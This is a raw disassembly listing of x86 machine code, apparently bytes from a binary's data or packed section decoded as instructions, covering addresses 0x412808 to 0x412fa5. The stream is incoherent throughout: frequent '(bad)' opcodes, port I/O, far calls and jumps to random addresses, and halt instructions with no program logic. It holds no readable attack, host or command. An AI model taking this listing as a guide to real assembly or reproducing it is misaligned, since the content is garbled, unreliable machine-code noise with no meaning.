  412808:	outs   dx,DWORD PTR ds:[esi]
  412809:	in     al,0x13
  41280b:	add    DWORD PTR [esi+0x56],esi
  41280e:	(bad)  
  41280f:	mov    ebx,DWORD PTR [ecx]
  412811:	sbb    ah,BYTE PTR [ecx]
  412813:	and    BYTE PTR [ecx],0x47
  412816:	data16 mov al,0x2c
  412819:	add    al,0x30
  41281b:	jae    0x412803
  41281d:	sbb    eax,0xd049532d
  412822:	xor    eax,0x77541695
  412827:	stos   DWORD PTR es:[edi],eax
  412828:	(bad)  
  412829:	mov    ebp,0x51897868
  41282e:	sbb    BYTE PTR [esi+ebp*1+0x50c9a8a3],bl
  412835:	sub    BYTE PTR [ecx-0x12],bl
  412838:	inc    eax
  412839:	test   bh,cl
  41283b:	mov    al,ds:0x9bce7a7
  412840:	fadd   DWORD PTR [ebx]
  412842:	and    BYTE PTR [ecx],dl
  412844:	dec    esp
  412845:	mov    eax,ds:0xe0a08d48
  41284a:	or     al,0x8c
  41284c:	sub    BYTE PTR [eax],dh
  41284e:	cdq    
  41284f:	xor    DWORD PTR [esi-0x8bf755e],edx
  412855:	dec    ebx
  412856:	shr    BYTE PTR [ebp-0x37],1
  412859:	rol    DWORD PTR [ebp-0x66],1
  41285c:	das    
  41285d:	mov    esp,DWORD PTR [ebx]
  41285f:	dec    ecx
  412860:	jmp    FWORD PTR [esi]
  412862:	mov    esp,0x949c19f1
  412867:	jno    0x4127ff
  412869:	js     0x412892
  41286b:	mov    edi,DWORD PTR [edx]
  41286d:	sub    DWORD PTR [edx],edi
  41286f:	dec    edi
  412870:	add    DWORD PTR [eax+0x20],esp
  412873:	stos   DWORD PTR es:[edi],eax
  412874:	mov    al,dl
  412876:	mov    eax,0x1fbdece0
  41287b:	mov    ds:0x6877981f,eax
  412880:	lds    edx,FWORD PTR [esi+esi*2-0x63]
  412884:	sub    DWORD PTR [edx-0x2e1cc8db],esi
  41288a:	icebp  
  41288b:	retf   
  41288c:	mov    BYTE PTR [ecx+ebx*4+0x56],al
  412890:	adc    bl,ah
  412892:	adc    al,0x70
  412894:	add    eax,0x8c3a41b0
  412899:	popf   
  41289a:	or     ebx,eax
  41289c:	adc    dh,ah
  41289e:	push   edx
  41289f:	cmc    
  4128a0:	mov    ecx,0x24ff2a78
  4128a5:	iret   
  4128a6:	xor    al,0xab
  4128a8:	inc    ebp
  4128a9:	lock stos BYTE PTR es:[edi],al
  4128ab:	push   cs
  4128ac:	daa    
  4128ad:	(bad)  
  4128ae:	cmp    eax,0x16c22af8
  4128b3:	imul   esp,DWORD PTR [ebx+0xa],0x3b
  4128b7:	hlt    
  4128b8:	je     0x41285e
  4128ba:	rcl    BYTE PTR [eax],0xb6
  4128bd:	jg     0x412876
  4128bf:	les    ebx,FWORD PTR [esi]
  4128c1:	es hlt 
  4128c3:	jge    0x4128f9
  4128c5:	push   cs
  4128c6:	jno    0x4128a9
  4128c8:	aas    
  4128c9:	mov    ch,0xda
  4128cb:	mul    DWORD PTR [ecx-0x2c359e02]
  4128d1:	fmul   st(3),st
  4128d3:	addr16 jge 0x412942
  4128d6:	cmp    eax,0xfb181742
  4128db:	in     eax,dx
  4128dc:	lods   al,BYTE PTR ds:[esi]
  4128dd:	mov    edi,0xd80c4281
  4128e2:	push   0xbc5ec9e3
  4128e7:	xchg   edi,eax
  4128e8:	out    0x7f,al
  4128ea:	mov    es,WORD PTR [ebx+ecx*8+0x0]
  4128ee:	out    dx,al
  4128ef:	mov    ch,0x42
  4128f1:	jb     0x412948
  4128f3:	loopne 0x41295d
  4128f5:	mov    bh,BYTE PTR [ebp-0x48dc05f1]
  4128fb:	mov    al,0x6d
  4128fd:	cmp    BYTE PTR [ebx],ah
  4128ff:	inc    ecx
  412900:	enter  0x6064,0x54
  412904:	call   0xa29aaff9
  412909:	push   ds
  41290a:	sbb    dl,al
  41290c:	or     al,0x71
  41290e:	fnstenv [edx-0x5c]
  412911:	jmp    0x7edcef1d
  412916:	xchg   esp,eax
  412917:	fst    DWORD PTR [eax]
  412919:	adc    DWORD PTR [esi+0x1],ecx
  41291c:	mov    bl,0x17
  41291e:	add    al,BYTE PTR [ebx+ebp*8-0x2888cdf9]
  412925:	push   ebx
  412926:	sbb    al,0x41
  412928:	sub    DWORD PTR [edx],ebx
  41292a:	jl     0x412966
  41292c:	or     al,0x27
  41292e:	cmp    cl,ah
  412930:	leave  
  412931:	sbb    BYTE PTR [esi+edx*2+0x37],ch
  412935:	cmp    esp,edx
  412937:	mov    ebx,0x89da25d9
  41293c:	(bad)  
  41293d:	xchg   esi,eax
  41293e:	repnz xor dh,dh
  412941:	mov    es,WORD PTR [eax+0x74]
  412944:	sbb    al,0x89
  412946:	fidivr DWORD PTR ds:0xfc0f8f84
  41294c:	xor    dh,BYTE PTR [ebp-0x41]
  41294f:	mov    DWORD PTR [ecx+ecx*4-0x5a],esp
  412953:	xor    ebp,DWORD PTR [ebp-0x4c]
  412956:	push   ebx
  412957:	test   eax,0xa761b24d
  41295c:	xchg   ebp,eax
  41295d:	pop    ebp
  41295e:	das    
  41295f:	dec    eax
  412960:	sub    eax,0x3a06e5c9
  412965:	add    eax,0xb18f856f
  41296a:	sti    
  41296b:	imul   eax,DWORD PTR [eax-0x3a],0xffffffd6
  41296f:	or     edx,esi
  412971:	retf   0x8dc1
  412974:	stc    
  412975:	(bad)  
  412976:	(bad)  
  412977:	je     0x41291c
  412979:	mov    WORD PTR [edx-0x40a5cc7f],?
  41297f:	jle    0x4129d9
  412981:	inc    ebx
  412982:	or     eax,0x437bdbfa
  412987:	out    0x1f,al
  412989:	(bad)  
  41298a:	pop    ebp
  41298b:	sar    esp,cl
  41298d:	mov    ds:0x8b3907a4,eax
  412992:	loopne 0x41296c
  412994:	push   0x52
  412996:	lock jno 0x4129c4
  412999:	push   0xd
  41299b:	rol    BYTE PTR [eax+0x24],1
  41299e:	out    dx,al
  41299f:	and    DWORD PTR [ecx-0x28],esi
  4129a2:	pushf  
  4129a3:	jmp    0xf7dd39cf
  4129a8:	lods   al,BYTE PTR ds:[esi]
  4129a9:	aaa    
  4129aa:	ret    
  4129ab:	aam    0xb3
  4129ad:	jno    0x412992
  4129af:	dec    esp
  4129b0:	and    al,0x5d
  4129b2:	mov    ah,BYTE PTR [ebx+0x57447af3]
  4129b8:	rol    bh,1
  4129ba:	(bad)  
  4129bb:	out    0x2b,eax
  4129bd:	loopne 0x4129c6
  4129bf:	jp     0x41296c
  4129c1:	in     eax,dx
  4129c2:	xchg   bl,dl
  4129c4:	push   ss
  4129c5:	mov    esp,ebx
  4129c7:	mov    edi,0x6d95c9b9
  4129cc:	dec    ebp
  4129cd:	xor    al,0xd2
  4129cf:	mov    bh,BYTE PTR [esi+eax*8-0xb]
  4129d3:	mov    ch,0xc
  4129d5:	sub    eax,0xad69dfa2
  4129da:	cmp    ebp,DWORD PTR [esi-0x1ae88a2]
  4129e0:	inc    ebp
  4129e1:	push   edx
  4129e2:	inc    edx
  4129e3:	das    
  4129e4:	cmp    DWORD PTR [eax-0x5d],ecx
  4129e7:	push   ebp
  4129e8:	add    al,0x97
  4129ea:	ja     0x412a00
  4129ec:	rcr    bh,0x89
  4129ef:	cmp    ah,BYTE PTR [ecx+0x3a]
  4129f2:	jmp    0x7baef684
  4129f7:	repz (bad) 
  4129f9:	popa   
  4129fa:	mov    bh,0xa4
  4129fc:	pop    ebp
  4129fd:	fs push es
  4129ff:	addr16 test al,0xd1
  412a02:	adc    DWORD PTR [edi-0x6c],ecx
  412a05:	adc    DWORD PTR [ebx-0x73eebf19],esp
  412a0b:	lock pop ss
  412a0d:	fldenv [edi+0x3c726164]
  412a13:	sbb    ebx,DWORD PTR ds:0x97a63f0e
  412a19:	or     esi,DWORD PTR [ebp-0x349a3980]
  412a1f:	cmp    al,0xf9
  412a21:	xchg   edi,eax
  412a22:	aad    0x94
  412a24:	repnz out 0x83,al
  412a27:	or     BYTE PTR [ecx-0x61075c77],0x42
  412a2e:	out    0x95,eax
  412a30:	sub    eax,0x3285a048
  412a35:	xchg   edx,eax
  412a36:	scas   al,BYTE PTR es:[edi]
  412a37:	fisubr DWORD PTR [ebp-0x3f]
  412a3a:	push   ds
  412a3b:	(bad)  
  412a3c:	pusha  
  412a3d:	gs cmp eax,0xc415bfe9
  412a43:	cmp    al,BYTE PTR [edx-0xd]
  412a46:	cmp    al,0x98
  412a48:	jmp    0xb850f7ab
  412a4d:	ins    BYTE PTR es:[edi],dx
  412a4e:	pusha  
  412a4f:	call   0xaa6b:0xa43ed1c3
  412a56:	pop    ebx
  412a57:	mov    BYTE PTR [esi],dh
  412a59:	jb     0x412a89
  412a5b:	jnp    0x412a3b
  412a5d:	repz cs xchg esp,eax
  412a60:	sbb    al,0x5c
  412a62:	mov    ds:0x56b9b905,eax
  412a67:	lea    esp,ds:[ebx+0x57030fba]
  412a6e:	in     eax,0x11
  412a70:	icebp  
  412a71:	lea    esp,[eax]
  412a73:	cmp    ch,BYTE PTR [eax-0x90d3c0f]
  412a79:	xchg   ebx,eax
  412a7a:	lock ret 
  412a7c:	mov    ecx,0x219aad2a
  412a81:	sbb    al,0x7f
  412a83:	inc    ebx
  412a84:	jge    0x412b05
  412a86:	push   0x2340655f
  412a8b:	pop    ebp
  412a8c:	aaa    
  412a8d:	(bad)  
  412a8e:	mov    ecx,fs
  412a90:	pop    esi
  412a91:	enter  0xec62,0xe9
  412a95:	lds    ebx,FWORD PTR [esi-0x788467a2]
  412a9b:	or     DWORD PTR [esi-0x7a],0x6d
  412a9f:	jo     0x412a75
  412aa1:	sbb    DWORD PTR [ebx+0xe3c5db1],ebp
  412aa7:	test   eax,0xc0c316ca
  412aac:	out    0x13,al
  412aae:	ficom  WORD PTR [eax]
  412ab0:	loopne 0x412aaf
  412ab2:	fdiv   st(2),st
  412ab4:	or     al,0x9b
  412ab6:	cld    
  412ab7:	fild   DWORD PTR [esi]
  412ab9:	pop    ds
  412aba:	dec    edi
  412abb:	loopne 0x412a3e
  412abd:	ficom  DWORD PTR [bp+di]
  412ac0:	or     bh,0xf1
  412ac3:	loopne 0x412a98
  412ac5:	jne    0x412a53
  412ac7:	push   esi
  412ac8:	nop
  412ac9:	(bad)  
  412aca:	jne    0x412ab8
  412acc:	cmp    bl,BYTE PTR [edx-0x73]
  412acf:	les    edx,FWORD PTR [ebx-0x31]
  412ad2:	imul   edx,DWORD PTR [ebp-0x7f639ebd],0xdd6375c6
  412adc:	jmp    0x412b45
  412ade:	ror    BYTE PTR [ebx+0x5be3dd06],cl
  412ae4:	and    DWORD PTR [ebx-0x1d],0xffffffe9
  412ae8:	mov    dl,0xf0
  412aea:	stc    
  412aeb:	xor    al,0xe0
  412aed:	inc    ebx
  412aee:	je     0x412b60
  412af0:	xchg   ecx,eax
  412af1:	lods   eax,DWORD PTR ds:[esi]
  412af2:	mov    esp,0xe9b95258
  412af7:	fcom   QWORD PTR [edi]
  412af9:	push   edi
  412afa:	jle    0x412a86
  412afc:	shr    BYTE PTR [ebp-0x17054f11],0x85
  412b03:	push   esp
  412b04:	sbb    eax,0x5b3704fa
  412b09:	jne    0x412ace
  412b0b:	jbe    0x412ad2
  412b0d:	and    BYTE PTR [ebx-0x3934db1d],al
  412b13:	data16 jne 0x412abe
  412b16:	mov    esi,0x7fa81fa2
  412b1b:	pusha  
  412b1c:	retf   0x9ac0
  412b1f:	or     DWORD PTR [ecx-0x1d],ebp
  412b22:	xchg   esi,eax
  412b23:	jp     0x412abe
  412b25:	int3   
  412b26:	add    BYTE PTR [edx+0x63144a1d],dh
  412b2c:	mov    ds:0x91c81996,al
  412b31:	pusha  
  412b32:	or     BYTE PTR [ebx-0xe60117a],ch
  412b38:	pop    ecx
  412b39:	sbb    eax,0x2ce5fbd2
  412b3e:	sbb    BYTE PTR [esi+edx*8+0x476b084d],cl
  412b45:	mov    bh,0x50
  412b47:	push   0xff0c1417
  412b4c:	pop    es
  412b4d:	jo     0x412ada
  412b4f:	pushf  
  412b50:	cmp    al,0x31
  412b52:	daa    
  412b53:	lock inc ebp
  412b55:	dec    esi
  412b56:	repnz cmp bh,BYTE PTR [edi]
  412b59:	pop    edx
  412b5a:	xchg   ebx,eax
  412b5b:	push   edi
  412b5c:	sub    eax,0x78b8cc70
  412b61:	(bad)  
  412b62:	std    
  412b63:	and    edx,ebp
  412b65:	das    
  412b66:	fst    DWORD PTR [edi-0x1938ebb0]
  412b6c:	call   0x569c:0x327e8b31
  412b73:	mov    dh,0x50
  412b75:	(bad)  
  412b76:	mov    esi,0x92f0ae81
  412b7b:	bound  edx,QWORD PTR ds:[eax-0xa78428c]
  412b82:	xchg   ecx,eax
  412b83:	or     eax,0x85a38eb2
  412b88:	(bad)
  412b8d:	cli    
  412b8e:	add    edx,DWORD PTR [esp+ebx*2+0x44173a20]
  412b95:	cmp    DWORD PTR [ecx+0x69],eax
  412b98:	rcr    DWORD PTR [ebp-0x7e2f046a],1
  412b9e:	push   esp
  412b9f:	inc    ecx
  412ba0:	test   BYTE PTR [ecx+edi*4],bh
  412ba3:	jmp    0x412b46
  412ba5:	sbb    eax,0xf30f4b17
  412baa:	cmp    eax,DWORD PTR [ecx+eax*2-0xd0066e6]
  412bb1:	cld    
  412bb2:	mov    ebp,cs
  412bb4:	popa   
  412bb5:	jno    0x412bd6
  412bb7:	xor    al,0x72
  412bb9:	lahf   
  412bba:	sahf   
  412bbb:	retf   0x6ac7
  412bbe:	test   dl,dl
  412bc0:	call   0x52eb4d01
  412bc5:	cli    
  412bc6:	cmp    DWORD PTR [esi],ebx
  412bc8:	dec    ebx
  412bc9:	adc    DWORD PTR [esi+0x3b],esi
  412bcc:	mov    cl,0x8e
  412bce:	fs push es
  412bd0:	dec    ebp
  412bd1:	mov    cl,0x20
  412bd3:	pop    esp
  412bd4:	pop    ebp
  412bd5:	mov    edx,0x6a83fad5
  412bda:	mov    fs:0xb48c5b4,al
  412be0:	ds jne 0x412c56
  412be3:	dec    eax
  412be4:	arpl   si,bp
  412be6:	sbb    DWORD PTR [edi-0x39d03c05],esi
  412bec:	pop    esp
  412bed:	outs   dx,BYTE PTR ds:[esi]
  412bee:	arpl   sp,dx
  412bf0:	mov    ebp,0x883fead4
  412bf5:	mov    bh,0xbb
  412bf7:	nop
  412bf8:	fmul   st(0),st
  412bfa:	push   0x41
  412bfc:	mov    al,0x75
  412bfe:	mov    ds:0xf3fec0e0,al
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	jle    0x412c63
  412c06:	mov    al,ch
  412c08:	jp     0x412c57
  412c0a:	sub    eax,0x624b219c
  412c0f:	arpl   WORD PTR [edi+eiz*4],di
  412c12:	hlt    
  412c13:	dec    eax
  412c14:	inc    ebp
  412c15:	and    al,0xd4
  412c17:	in     al,dx
  412c18:	lods   eax,DWORD PTR ds:[esi]
  412c19:	mov    ebp,0xbc5d91b3
  412c1e:	adc    eax,0x15a906f6
  412c23:	in     eax,dx
  412c24:	cdq    
  412c25:	sti    
  412c26:	out    0x3f,eax
  412c28:	jns    0x412bc5
  412c2a:	jle    0x412c55
  412c2c:	stos   BYTE PTR es:[edi],al
  412c2d:	sub    BYTE PTR [ecx-0x50c35cb8],bl
  412c33:	inc    ebx
  412c34:	dec    edx
  412c35:	sbb    ebx,ecx
  412c37:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c39:	out    dx,al
  412c3a:	and    DWORD PTR [eax-0x52],edi
  412c3d:	in     eax,0x69
  412c3f:	nop
  412c40:	adc    esp,DWORD PTR [edx+edx*8+0x3d]
  412c44:	sbb    ah,BYTE PTR [eax-0x685e9aed]
  412c4a:	stos   BYTE PTR es:[edi],al
  412c4b:	dec    ebp
  412c4c:	sub    BYTE PTR [edi-0x23],0xdf
  412c50:	ins    DWORD PTR es:[edi],dx
  412c51:	(bad)  
  412c53:	sub    eax,0x9af16e3a
  412c58:	dec    ecx
  412c59:	xchg   DWORD PTR [edx-0x25],edi
  412c5c:	iret   
  412c5d:	xor    cl,BYTE PTR [eax+ebp*8+0x2d]
  412c61:	inc    edx
  412c62:	daa    
  412c63:	ss aas 
  412c65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c66:	out    dx,eax
  412c67:	outs   dx,BYTE PTR ds:[esi]
  412c68:	arpl   WORD PTR [edx-0x27d9fc08],si
  412c6e:	sub    al,0x12
  412c70:	ins    DWORD PTR es:[edi],dx
  412c71:	mul    BYTE PTR [edi]
  412c73:	xchg   edx,eax
  412c74:	pop    es
  412c75:	mov    ecx,0xd88fb83f
  412c7a:	pop    edi
  412c7b:	cmp    edx,DWORD PTR [edx+edx*4+0x75]
  412c7f:	je     0x412c8c
  412c81:	aad    0x1e
  412c83:	mov    ebx,0xd1d4ea93
  412c88:	sti    
  412c89:	lods   eax,DWORD PTR ds:[esi]
  412c8a:	xlat   BYTE PTR ds:[ebx]
  412c8b:	dec    edi
  412c8c:	nop
  412c8d:	aaa    
  412c8e:	xor    cl,BYTE PTR [edx]
  412c90:	dec    ebx
  412c91:	sahf   
  412c92:	out    dx,eax
  412c93:	mov    eax,0x2855f523
  412c98:	jnp    0x412ca8
  412c9a:	push   ebp
  412c9b:	xchg   esp,eax
  412c9c:	out    dx,eax
  412c9d:	test   BYTE PTR [esi+0x1a4cafee],bl
  412ca3:	jl     0x412c3d
  412ca5:	das    
  412ca6:	ds pop esi
  412ca8:	(bad)  
  412ca9:	jb     0x412cf6
  412cab:	inc    esp
  412cac:	inc    eax
  412cad:	jmp    0x412cf3
  412caf:	pop    ss
  412cb0:	pop    ebx
  412cb1:	je     0x412cd1
  412cb3:	xchg   esp,eax
  412cb4:	xor    cl,BYTE PTR [eax]
  412cb6:	je     0x412ca5
  412cb8:	sbb    esp,eax
  412cba:	adc    DWORD PTR [edx-0x1d],esi
  412cbd:	enter  0x6978,0xf6
  412cc1:	cwde   
  412cc2:	sub    ecx,DWORD PTR [eax+0x5a]
  412cc5:	das    
  412cc6:	sub    ecx,0xc
  412cc9:	and    ch,BYTE PTR [edi]
  412ccb:	adc    al,0x11
  412ccd:	call   0x355a:0x7bdee533
  412cd4:	pop    esi
  412cd5:	aad    0xbb
  412cd7:	call   0xb69d:0x5458787b
  412cde:	clc    
  412cdf:	cmp    DWORD PTR [ecx+0x74],esi
  412ce2:	nop
  412ce3:	push   esi
  412ce4:	jecxz  0x412d03
  412ce6:	mov    ebp,0xeb99121d
  412ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cec:	xchg   ecx,eax
  412ced:	js     0x412cb4
  412cef:	jno    0x412c88
  412cf1:	dec    esi
  412cf2:	ret    
  412cf3:	mov    al,0xf1
  412cf5:	dec    DWORD PTR [ecx+0xb]
  412cf8:	and    eax,0x4df28d9d
  412cfd:	ins    DWORD PTR es:[edi],dx
  412cfe:	arpl   WORD PTR [eax+0x58],bx
  412d01:	ja     0x412ce4
  412d03:	push   0xc9178c5a
  412d08:	inc    eax
  412d09:	adc    eax,0x8e5f1bea
  412d0e:	aas    
  412d0f:	pop    ss
  412d10:	outs   dx,DWORD PTR ds:[esi]
  412d11:	ror    BYTE PTR [esi+edi*4+0x73],1
  412d15:	or     BYTE PTR [esi+ebx*4-0x3b3a0ba6],ch
  412d1c:	(bad)  
  412d1d:	clc    
  412d1e:	mov    ebx,0xa048d0b2
  412d23:	(bad)  
  412d24:	pop    ds
  412d25:	les    esi,FWORD PTR [edx-0x15]
  412d28:	push   esi
  412d29:	and    BYTE PTR [ecx+0x24],0x49
  412d2d:	pop    ebx
  412d2e:	retf   0xa615
  412d31:	bound  ecx,QWORD PTR [bx+di+0x41]
  412d35:	loopne 0x412d50
  412d37:	fimul  WORD PTR ds:[ecx]
  412d3a:	inc    esp
  412d3b:	and    cl,BYTE PTR [ebx]
  412d3d:	nop
  412d3e:	sbb    edx,DWORD PTR ds:0x39c0e00e
  412d44:	div    ah
  412d46:	inc    edi
  412d47:	jg     0x412ce9
  412d49:	ja     0x412cdd
  412d4b:	mov    dl,0x10
  412d4d:	popa   
  412d4e:	or     DWORD PTR [ecx],ecx
  412d50:	or     dh,BYTE PTR [ebp+0x2a]
  412d53:	in     al,dx
  412d54:	int    0xaf
  412d56:	sub    BYTE PTR [edi+ecx*1-0x29c37df5],bh
  412d5d:	stc    
  412d5e:	(bad)  
  412d5f:	push   ecx
  412d60:	fisttp QWORD PTR [edi+edi*4+0x2f20a2c7]
  412d67:	pop    es
  412d68:	std    
  412d69:	jne    0x412d93
  412d6b:	out    dx,eax
  412d6c:	test   al,0xb8
  412d6e:	ret    0x3a1
  412d71:	inc    ebx
  412d72:	and    DWORD PTR [eax-0x71],ecx
  412d75:	outs   dx,BYTE PTR ds:[esi]
  412d76:	inc    ecx
  412d77:	adc    al,0x8
  412d79:	mov    ah,0xfa
  412d7b:	dec    ebx
  412d7c:	cli    
  412d7d:	(bad)  
  412d7e:	addr16 popf 
  412d80:	add    eax,DWORD PTR ds:0xca769348
  412d86:	pop    ebp
  412d87:	inc    edx
  412d88:	add    BYTE PTR [eax-0xc31adb8],bl
  412d8e:	sub    BYTE PTR [ecx-0x617e32f1],dl
  412d94:	sub    edi,ecx
  412d96:	sub    DWORD PTR [ecx+0x6ab326f2],edi
  412d9c:	ss xor al,0x63
  412d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412da0:	dec    ebp
  412da1:	fdivr  DWORD PTR ds:[ebp+ecx*2-0x7a]
  412da6:	dec    edi
  412da7:	pop    es
  412da8:	ret    0x164d
  412dab:	xchg   DWORD PTR [edx-0x405d95ac],eax
  412db1:	jle    0x412e07
  412db3:	(bad)  
  412db4:	stos   BYTE PTR es:[edi],al
  412db5:	adc    ch,BYTE PTR [ebp+0x25]
  412db8:	inc    ecx
  412db9:	ja     0x412db9
  412dbb:	mov    esi,0x509a8bbb
  412dc0:	fld    TBYTE PTR [esi-0x7a]
  412dc3:	iret   
  412dc4:	inc    esp
  412dc5:	mov    ebx,0xe13d36b0
  412dca:	enter  0x7cdb,0x38
  412dce:	adc    DWORD PTR [ecx+0xb],ebp
  412dd1:	call   0xbf2bbeb6
  412dd6:	ja     0x412d89
  412dd8:	idiv   DWORD PTR [edi]
  412dda:	adc    ch,BYTE PTR [ecx-0x5ed0f8d8]
  412de0:	mov    DWORD PTR [ebx+ecx*4],ecx
  412de3:	stc    
  412de4:	out    0x98,al
  412de6:	mov    esi,0x84da4c32
  412deb:	sub    ecx,DWORD PTR [eax-0x34]
  412dee:	jge    0x412d72
  412df0:	and    esi,esp
  412df2:	cmp    bl,ch
  412df4:	retf   0x636
  412df7:	lds    edi,FWORD PTR [edi*8+0x62c723eb]
  412dfe:	call   0x5b6b4242
  412e03:	jl     0x412ddb
  412e05:	into   
  412e06:	ins    BYTE PTR es:[edi],dx
  412e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e08:	cdq    
  412e09:	outs   dx,BYTE PTR ds:[esi]
  412e0a:	fiadd  DWORD PTR [esi+esi*1+0x1dc40f5b]
  412e11:	in     eax,dx
  412e12:	cdq    
  412e13:	inc    edx
  412e14:	retf   
  412e15:	test   BYTE PTR [esi+0x52f8b42d],0x5
  412e1c:	push   0xffffffb1
  412e1e:	lods   al,BYTE PTR ds:[esi]
  412e1f:	les    ecx,FWORD PTR [ebp+edi*1-0x6]
  412e23:	push   esi
  412e24:	(bad)  
  412e26:	push   esi
  412e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e29:	dec    ebp
  412e2a:	sbb    BYTE PTR [eax],al
  412e2c:	xchg   edx,eax
  412e2d:	mov    ah,0x81
  412e2f:	fadd   DWORD PTR [ebx+0x5e724fed]
  412e35:	mov    ah,0xa4
  412e38:	push   cs
  412e39:	pop    ebx
  412e3a:	pop    ss
  412e3b:	ss retf 0x5e4
  412e3f:	xchg   DWORD PTR [ebx+0x21],ebx
  412e42:	adc    BYTE PTR [edi+0x2b],bl
  412e45:	dec    edi
  412e46:	popa   
  412e47:	sbb    DWORD PTR [ebp+0x54],ecx
  412e4a:	nop
  412e4b:	scas   al,BYTE PTR es:[edi]
  412e4c:	das    
  412e4d:	mov    ebx,ebx
  412e4f:	add    al,0x64
  412e51:	dec    edi
  412e52:	xchg   esp,eax
  412e53:	mov    gs,WORD PTR [edi+0x4f99cc6c]
  412e59:	rol    cl,cl
  412e5b:	mov    esp,0xac518e26
  412e60:	inc    ebp
  412e61:	cld    
  412e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e63:	jb     0x412e8b
  412e65:	xor    al,BYTE PTR [esi+0x1b]
  412e68:	xor    eax,0x728b82de
  412e6d:	push   cs
  412e6e:	dec    edx
  412e6f:	jp     0x412eda
  412e71:	cmp    al,0xf
  412e73:	in     al,0xe1
  412e75:	icebp  
  412e76:	ss push 0xffffffb4
  412e79:	leave  
  412e7a:	add    edi,ebx
  412e7c:	mov    eax,0x77fe4b73
  412e81:	outs   dx,BYTE PTR ds:[esi]
  412e82:	int    0xa
  412e84:	lods   al,BYTE PTR ds:[esi]
  412e85:	pop    edx
  412e86:	or     eax,0x987bbd9c
  412e8b:	pop    edi
  412e8c:	sbb    al,0x5f
  412e8e:	add    eax,0xbeaf72f4
  412e93:	adc    al,0x0
  412e95:	and    ebx,ecx
  412e97:	(bad)  
  412e98:	push   0xffffffd0
  412e9a:	je     0x412e8c
  412e9c:	bound  ecx,QWORD PTR [edx+0x6a]
  412e9f:	int3   
  412ea0:	fdivr  st(3),st
  412ea2:	mov    ebx,0xc682527e
  412ea7:	in     eax,0x28
  412ea9:	mov    ch,0x8c
  412eab:	adc    eax,0x8065e65b
  412eb0:	jns    0x412ecc
  412eb2:	xlat   BYTE PTR ds:[ebx]
  412eb3:	mov    ebx,0x4a08c02d
  412eb8:	cmp    BYTE PTR [esi+0x75],dh
  412ebb:	pop    ss
  412ebc:	popa   
  412ebd:	ds jl  0x412f0d
  412ec0:	sbb    ebp,DWORD PTR [ecx-0x643b51cc]
  412ec6:	push   edx
  412ec7:	pop    ebp
  412ec8:	ins    BYTE PTR es:[edi],dx
  412ec9:	mov    dl,0xbc
  412ecb:	add    al,0x78
  412ecd:	jae    0x412e97
  412ecf:	xchg   esp,eax
  412ed0:	mov    ds:0x904d281,al
  412ed5:	xor    ebx,ebp
  412ed7:	ins    DWORD PTR es:[edi],dx
  412ed8:	mov    DWORD PTR [ecx+edx*8+0x2ac65685],esi
  412edf:	xchg   esi,ebp
  412ee1:	adc    bh,ch
  412ee3:	jne    0x412e88
  412ee5:	or     ebp,ebx
  412ee7:	stc    
  412ee8:	mov    ah,0xc3
  412eea:	sahf   
  412eeb:	cmp    eax,0xb9c2f1b0
  412ef0:	sub    al,0x79
  412ef2:	std    
  412ef3:	xor    bl,BYTE PTR [edx]
  412ef5:	or     eax,0xa72e8d24
  412efa:	jl     0x412f2b
  412efc:	mov    ebx,0x4ed1bfef
  412f01:	xchg   esi,eax
  412f02:	mov    dh,0xde
  412f04:	dec    esi
  412f05:	mov    ah,0x6
  412f07:	dec    eax
  412f08:	in     al,dx
  412f09:	sub    al,0x67
  412f0b:	mov    edi,0x9c8fb764
  412f10:	cmp    eax,DWORD PTR [edx-0x43]
  412f13:	ror    esp,0x13
  412f16:	bound  esp,QWORD PTR [ecx+edi*4+0x3320318d]
  412f1d:	xor    edx,DWORD PTR [edx]
  412f1f:	jmp    0x4f097488
  412f24:	dec    edx
  412f25:	inc    ebx
  412f26:	(bad)  
  412f27:	xchg   ebp,eax
  412f28:	cmc    
  412f29:	ret    
  412f2a:	or     eax,0x77131a27
  412f2f:	data16 loopne 0x412f14
  412f32:	mov    ch,0x44
  412f34:	scas   al,BYTE PTR es:[edi]
  412f35:	mov    ah,0x8e
  412f37:	jb     0x412f27
  412f39:	inc    edi
  412f3a:	popa   
  412f3b:	aaa    
  412f3c:	xor    eax,0xbfcc3805
  412f41:	push   esi
  412f42:	sub    ecx,DWORD PTR ds:0xd3fcf541
  412f48:	and    edx,DWORD PTR [ebx+0x36]
  412f4b:	xchg   ebx,eax
  412f4c:	test   al,0x77
  412f4e:	loopne 0x412f26
  412f50:	mov    esp,0xcc3f7b7c
  412f55:	push   cs
  412f56:	jnp    0x412eff
  412f58:	jnp    0x412f39
  412f5a:	or     bl,al
  412f5c:	pushf  
  412f5d:	and    ebp,DWORD PTR [esi]
  412f5f:	push   eax
  412f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f61:	inc    edx
  412f62:	cli    
  412f63:	fldcw  WORD PTR [edx-0xda3d1b9]
  412f69:	scas   eax,DWORD PTR es:[edi]
  412f6a:	(bad)  
  412f6b:	fdiv   QWORD PTR [ecx]
  412f6d:	cmp    DWORD PTR [ebp+0x1a],eax
  412f70:	add    BYTE PTR [ebx+0x1c],bh
  412f73:	(bad)  
  412f74:	sbb    edi,esi
  412f76:	(bad)  
  412f77:	push   0xae1b8db4
  412f7c:	gs xor al,0x53
  412f7f:	cs iret 
  412f81:	aam    0xd3
  412f83:	jmp    0x412f5b
  412f85:	xchg   edx,eax
  412f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f87:	cli    
  412f88:	call   0xae74ccfa
  412f8d:	xchg   edx,eax
  412f8e:	jns    0x412fb3
  412f90:	mov    DWORD PTR [eax-0xa],esi
  412f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f94:	or     cl,BYTE PTR [esi+ebx*2]
  412f97:	in     al,dx
  412f98:	xor    DWORD PTR [ebp+edx*8-0x4a],0xe7dfd43d
  412fa0:	sahf   
  412fa1:	mov    ah,0xff
  412fa3:	int3   
  412fa4:	dec    esi
  412fa5:	aaa    
